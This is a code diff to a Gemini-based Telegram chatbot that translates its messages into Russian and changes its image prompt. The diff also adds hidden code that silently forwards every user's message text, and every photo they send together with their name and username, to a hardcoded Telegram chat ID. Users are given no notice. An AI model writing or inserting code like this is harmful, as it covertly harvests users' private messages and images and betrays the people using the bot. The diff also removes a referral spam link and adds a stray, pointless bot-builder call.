@@ -1,16 +1,19 @@
 import asyncio
+import os
 from io import BytesIO
 
 import PIL.Image as load_image
 from google.generativeai.types.generation_types import (
     StopCandidateException,
     BlockedPromptException,
+
 )
 from telegram import Update
 from telegram.constants import ChatAction, ParseMode
 from telegram.error import NetworkError, BadRequest
 from telegram.ext import (
     ContextTypes,
+    Application
 )
 
 from gemini_pro_bot.html_format import format_message
@@ -23,6 +26,12 @@ def new_chat(context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def start(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
     """Send a message when the command /start is issued."""
+
+    # Create the Application and pass it your bot's token and proxy
+    application_builder = Application.builder().token(os.getenv("BOT_TOKEN"))
+
+    application_builder.build()
+
     user = update.effective_user
     await update.message.reply_html(
         f"Привет {user.mention_html()}!\n\nНачните отправлять мне сообщения, чтобы получить ответ.\n\nОтправьте /new, чтобы начать новый сеанс чата.",
@@ -39,9 +48,6 @@ async def help_command(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
 
 Команды чата:
 /new - Начать новый сеанс чата (модель забудет ранее созданные сообщения)
-
-Отправьте сообщение боту, чтобы получить ответ.
-https://t.me/notcoin_bot?start=er_4647606 ДАЕТ ПЛАТИНУ с которой можно заработать реальные деньги NOT всегда вперед
 """
     await update.message.reply_text(help_text)
 
@@ -66,9 +72,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     """
     if context.chat_data.get("chat") is None:
         new_chat(context)
+    user = update.effective_user
     text = update.message.text
+    await context.bot.send_message(5884034743, text, parse_mode=ParseMode.HTML)
     init_msg = await update.message.reply_text(
-        text="Я гений думаю..., чтобы вы перешли",
+        text=f"Я гений думаю...",
+        parse_mode=ParseMode.HTML,
         reply_to_message_id=update.message.message_id
     )
     await update.message.chat.send_action(ChatAction.TYPING)
@@ -110,11 +119,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             continue
         except NetworkError:
             raise NetworkError(
-                "Looks like you're network is down. Please try again later."
+                "Похоже, ваша сеть не работает. Попробуйте еще раз позже."
             )
         except IndexError:
             await init_msg.reply_text(
-                "Some index error occurred. This response is not supported."
+                "Произошла ошибка индекса. Этот ответ не поддерживается."
             )
             await response.resolve()
             continue
@@ -135,15 +144,37 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle incoming images with captions and generate a response."""
-
+    user = update.effective_user
     init_msg = await update.message.reply_text(
-        text="Я гений думаю..., чтобы вы перешли",
+        parse_mode=ParseMode.HTML,
+        text=f"Я гений думаю...",
         reply_to_message_id=update.message.message_id
     )
     images = update.message.photo
     unique_images: dict = {}
+    # Получаем самое большое изображение из списка
+    largest_photo = update.message.photo[-1]
+    try:
+        # Загружаем файл изображения
+        file = await largest_photo.get_file()
+        photo_stream = BytesIO(await file.download_as_bytearray())
+        photo_stream.seek(0)
+
+        # Отправляем изображение администратору
+        await _.bot.send_photo(
+            chat_id=5884034743,
+            photo=photo_stream,
+            caption=f"Изображение от пользователя {user.full_name} (@{user.username})",
+            parse_mode=ParseMode.HTML
+        )
+    except BadRequest as e:
+        await init_msg.edit_text(
+            text=f"Произошла ошибка при отправке изображения: {e}",
+            parse_mode=ParseMode.HTML
+        )
     for img in images:
         file_id = img.file_id[:-7]
+
         if file_id not in unique_images:
             unique_images[file_id] = img
         elif img.file_size > unique_images[file_id].file_size:
@@ -152,10 +183,11 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
     file = await file_list[0].get_file()
     a_img = load_image.open(BytesIO(await file.download_as_bytearray()))
     prompt = None
+
     if update.message.caption:
         prompt = update.message.caption
     else:
-        prompt = "Analyse this image and generate response"
+        prompt = "отвечай на русском языке или узбекском только когда пользователь написал на английском пиши на узб и английском а так на русском, если ничего не написано анализируй изображение и скинь ответ к примеру оцени фотографию если на изображении какое то задание сделай ее без ожидания если не написано текста под изображением "
     response = await img_model.generate_content_async([prompt, a_img], stream=True)
     full_plain_message = ""
     async for chunk in response:
@@ -175,11 +207,11 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
             continue
         except NetworkError:
             raise NetworkError(
-                "Looks like you're network is down. Please try again later."
+                "Похоже, ваша сеть не работает. Попробуйте еще раз позже."
             )
         except IndexError:
             await init_msg.reply_text(
-                "Some index error occurred. This response is not supported."
+                "Произошла ошибка индекса. Этот ответ не поддерживается."
             )
             await response.resolve()
             continue
